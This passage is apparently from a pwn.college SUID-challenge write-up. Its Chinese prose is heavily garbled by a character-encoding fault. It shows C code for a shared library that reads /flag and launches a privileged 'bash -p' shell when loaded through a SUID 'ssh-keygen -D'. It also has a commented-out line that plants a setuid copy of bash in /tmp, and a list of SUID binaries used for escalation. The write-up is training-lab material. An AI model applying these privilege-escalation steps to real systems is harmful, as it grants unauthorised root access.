<p><strong>é™æ€é“¾æ¥åº“</strong>ï¼Œåœ¨ä»¥å‰ï¼Œç¨‹åºæ˜¯ç‹¬ç«‹çš„ï¼Œç¼–ä¸ªç¨‹åºè¦ä»å¤´åˆ°å°¾è‡ªå·±è€ƒè™‘ã€‚åæ¥ä¸ºäº†æ–¹ä¾¿ï¼ŒæŠŠé€šç”¨çš„ç¨‹åºæ”¾åœ¨ä¸€èµ·ï¼Œè¿™å°±æ˜¯åº“ï¼Œé‡åˆ°éœ€è¦ç±»ä¼¼çš„åŠŸèƒ½å°±å¯ä»¥è°ƒç”¨ã€‚ä½†æ˜¯è¿™ä¸ªæœ‰ä¸ªé—®é¢˜ï¼Œè®¡ç®—æœºä¸çŸ¥é“ä½ è¦ç”¨çš„æ˜¯é“¾æ¥åº“å“ªä¸€ä¸ªç¨‹åºï¼Œ æ‰€ä»¥å®ƒä¸å¾—ä¸å°†é“¾æ¥åº“å…¨éƒ¨ç¨‹åºåŒ…å«è¿›æ¥ï¼Œä½¿å¾—ç¨‹åºå¾ˆå¤§ã€‚ <strong>åŠ¨æ€é“¾æ¥åº“</strong>ï¼Œæœ¬èº«å’Œé™æ€é“¾æ¥æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œä¹Ÿæ˜¯æŠŠé€šç”¨ä»£ç å†™è¿›ä¸€äº›ç‹¬ç«‹æ–‡ä»¶é‡Œï¼Œä½†æ˜¯åœ¨ç¼–è¯‘æ–¹é¢ï¼Œå¾®è½¯ç»•äº†ä¸ªåœˆå­ï¼Œå¹¶æ²¡æœ‰é‡‡å–æŠŠåº“æ–‡ä»¶åŠ è¿›ç¨‹åºçš„æ–¹æ³•ï¼Œè€Œæ˜¯æŠŠåº“æ–‡ä»¶åšæˆå·²ç»ç¼–è¯‘å¥½çš„ç¨‹åºï¼Œç»™å®ƒä»¬å¼€ä¸ªäº¤æ¢æ•°æ®çš„æ¥å£ï¼Œå†™ç¨‹åºçš„æ—¶å€™ï¼Œä¸€æ—¦è¦ä½¿ç”¨æŸä¸ªåº“æ–‡ä»¶çš„ä¸€ä¸ªåŠŸèƒ½å‡½æ•°ï¼Œç³»ç»Ÿå°±æŠŠè¿™ä¸ªåº“æ–‡ä»¶è°ƒå…¥å†…å­˜ï¼Œè¿æ¥ä¸Šè¿™ä¸ªç¨‹åºå æœ‰çš„ä»»åŠ¡è¿›ç¨‹ï¼Œç„¶åæ‰§è¡Œç¨‹åºè¦ç”¨çš„åŠŸèƒ½å‡½æ•°ï¼Œå¹¶æŠŠç»“æœè¿”å›ç»™ç¨‹åºæ˜¾ç¤ºå‡ºæ¥ï¼Œåœ¨æˆ‘ä»¬çœ‹æ¥ï¼Œå°±åƒæ˜¯ç¨‹åºè‡ªå·±å¸¦æœ‰çš„åŠŸèƒ½ä¸€æ ·ã€‚ å®Œæˆéœ€è¦çš„åŠŸèƒ½åï¼Œè¿™ä¸ªDLLåœæ­¢è¿è¡Œï¼Œæ•´ä¸ªè°ƒç”¨è¿‡ç¨‹ç»“æŸã€‚ DLLæ˜¯ç¼–è¯‘å¥½çš„ä»£ç ï¼Œä¸ä¸€èˆ¬ç¨‹åºæ²¡ä»€ä¹ˆå¤§å·®åˆ«ï¼Œåªæ˜¯å®ƒä¸èƒ½ç‹¬ç«‹è¿è¡Œï¼Œéœ€è¦ç¨‹åºè°ƒç”¨ã€‚DLLçš„ä»£ç å’Œå…¶ä»–ç¨‹åºå‡ å¹³æ²¡ä»€ä¹ˆä¸¤æ ·ï¼Œä»…ä»…æ˜¯æ¥å£å’Œå¯åŠ¨æ¨¡å¼ä¸åŒã€‚</p>
</li>
<li>
<p>gccå¯ä»¥é€šè¿‡<code>-shared</code>å‚æ•°æ¥åˆ›å»ºå…±äº«åº“ï¼Œå…±äº«åº“ä¸èƒ½å•ç‹¬è¿è¡Œï¼Œå®ƒç›¸å½“äºä¸€ä¸ªå¿…é¡»è¢«åˆ«äººè°ƒç”¨æ‰èƒ½è¿è¡Œçš„ç¨‹åºï¼Œå®ƒä¸æ™®é€šäºŒè¿›åˆ¶ç¨‹åºçš„åŒºåˆ«å¯ä»¥é€šè¿‡fileå‘½ä»¤æ¥æŸ¥çœ‹ï¼Œå…±äº«åº“æ²¡æœ‰<code>interpreter</code>è¿™æ ·çš„å­—æ®µï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰é“¾æ¥è§£é‡Šå™¨ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">gcc 51.c -shared -o su.os<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p>cç¨‹åºä¸­å¯ä»¥åˆ©ç”¨&lt;dlfcn.h&gt;å¤´æ–‡ä»¶ä¸­çš„ä¸€ç³»åˆ—å‡½æ•°dlopenï¼Œdlcloseæ¥åŠ è½½è¿è¡Œå…±äº«åº“ï¼Œè¯¦ç»†è¯´æ˜å¯ä»¥é€šè¿‡ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">man dlopen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>æ¥æŸ¥çœ‹ã€‚</p>
</li>
<li>
<p>lddå‘½ä»¤ ç”¨äºæ‰“å°ç¨‹åºæˆ–è€…åº“æ–‡ä»¶æ‰€ä¾èµ–çš„å…±äº«åº“åˆ—è¡¨ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥æŸ¥çœ‹æ˜¯å¦æœ‰å¯æ“ä½œçš„oså…±äº«åº“ï¼Œæ³¨å…¥æˆ‘ä»¬çš„ä»£ç ã€‚</p>
</li>
<li>
<p>å¦å¤–ä¸€ç§æŸ¥è¯¢æ–¹å¼æ˜¯åˆ©ç”¨straceæ¥æŸ¥çœ‹ç¨‹åºè¿è¡Œå…¨ç¨‹ï¼Œç„¶åå¯ä»¥ç”¨grepæ¥è¿‡æ»¤ä¸€ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">strace &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-so 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>ç¼–å†™51.cï¼š</p>
<pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
static void inject() __attribute__((constructor));
void C_GetFunctionList()&#123;
printf(&quot;euid:%d\n&quot;,geteuid());
sendfile(1,open(&quot;&#x2F;flag&quot;,0),0,4096);
&#x2F;&#x2F;system(&quot;cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash &amp;&amp; chmod +s &#x2F;tmp&#x2F;bash &amp;&amp; &#x2F;tmp&#x2F;bash -p&quot;);
char *argvv[]&#x3D;&#123;&quot;bash&quot;,&quot;-p&quot;,NULL&#125;;
execvp(&quot;&#x2F;bin&#x2F;bash&quot;,argvv);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç¼–è¯‘åç”¨ssh-keygençš„-Då‚æ•°è¿è¡Œå³å¯ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token number">51</span>.c <span class="token parameter variable">-shared</span> <span class="token parameter variable">-o</span> su.os
/challenge/babysuid_level51
ssh-keygen <span class="token parameter variable">-D</span> ./su.os<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“"></a> æ€»ç»“ï¼š</h3>
<p>æœ¬å°èŠ‚æ˜¯SUIDææƒï¼Œå¯ä»¥è®©æœ¬æ²¡æœ‰ç›¸åº”æƒé™çš„ç”¨æˆ·ï¼Œè®¿é—®å®ƒæ²¡æœ‰æƒé™è®¿é—®çš„ç¨‹åº</p>
<hr />
<blockquote>
<p>level1~6   å¸¸ç”¨çš„è¯»å–æ–‡ä»¶å†…å®¹çš„å‘½ä»¤ä¾æ¬¡ä¸ºï¼šcatã€moreã€lessã€tailã€headã€sortã€rev</p>
<p>level7~9 å¸¸è§çš„æ–‡æœ¬ç¼–è¾‘å™¨ ä¾æ¬¡ä¸ºï¼švimã€emacsã€nano</p>
<p>11~13ï¼š<strong>å¸¸è§çš„16è¿›åˆ¶è¯»å–å‘½ä»¤</strong>ï¼Œä¾æ¬¡ä¸ºï¼šodã€hexdump(hd)ã€xxd</p>
<p>level14~15 baseç³»åˆ—ç¼–ç å‘½ä»¤ä¾æ¬¡ä¸ºï¼šbase32ã€base64</p>
<p>16ï¼š<strong>åˆ†å‰²æ–‡ä»¶å‘½ä»¤</strong>ï¼Œä¸ºï¼šsplite</p>
<p>17~23ï¼š<strong>å¸¸è§å‹ç¼©è§£å‹ç¼©å‘½ä»¤</strong>ï¼Œä¾æ¬¡ä¸ºï¼šgzipã€bzip2ã€zipã€tarã€arã€cpioã€genisoimage</p>
<p>24~31ï¼š<strong>å¯æ‰§è¡Œå‘½ä»¤çš„å¸¸è§å‘½ä»¤</strong>ï¼Œä¾æ¬¡ä¸ºï¼šenvã€findã€makeã€niceã€timeoutã€stdbufã€setarchã€watch</p>
<p>32ï¼š<strong>å¸¸è§ç½‘ç»œè¿æ¥å·¥å…·</strong>ï¼Œä¸ºï¼šsocat</p>
<p>33ï¼š<strong>è„šæœ¬å¯¹è¯æ¡†å·¥å…·</strong>ï¼Œä¸ºï¼šwhiptail</p>
<p>34~36ï¼š<strong>æµå¼æ–‡æœ¬ç¼–è¾‘å™¨</strong>ï¼Œä¸ºï¼šawkã€sedã€ed</p>
<p>37~38ï¼š<strong>ä¿®æ”¹æ–‡ä»¶å½’å±è€…æˆ–æƒé™</strong>ï¼Œä¸ºï¼šchownã€chmod</p>
<p>39~40ï¼š<strong>å¸¸è§ç§»åŠ¨æ–‡ä»¶å‘½ä»¤</strong>ï¼Œcpã€mv</p>
<p>41~44ï¼šè„šæœ¬è§£é‡Šå™¨ perl python ruby bash</p>
<p>45~50 å…¶ä»–å¯è¯»å–æ–‡ä»¶çš„å‘½ä»¤ date,dmesg wc gcc as wget</p>
<p>51  ssh-keygen</p>
</blockquote>
</div></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2024/05/09/PwnCollege2-ProgramInteraction/" rel="prev" title="pwnCollege2-ProgramInteraction"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">pwnCollege2-ProgramInteraction</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2024/05/04/web-practices/" rel="next" title="web-practices"><span class="post-nav-text">web-practices</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>æ‚¨éœ€è¦ç§‘å­¦ä¸Šç½‘ï¼Œæ‰å¯ä½¿ç”¨è¯„è®ºåŒºåŠŸèƒ½ã€‚</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2024/05/09/PwnCollege1-ProgramMiuse/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank"></a></div><div class="copyright"><span>&copy; 2023 â€“ 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Npc</span></div><div class="footer-custom-text">=w=</div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>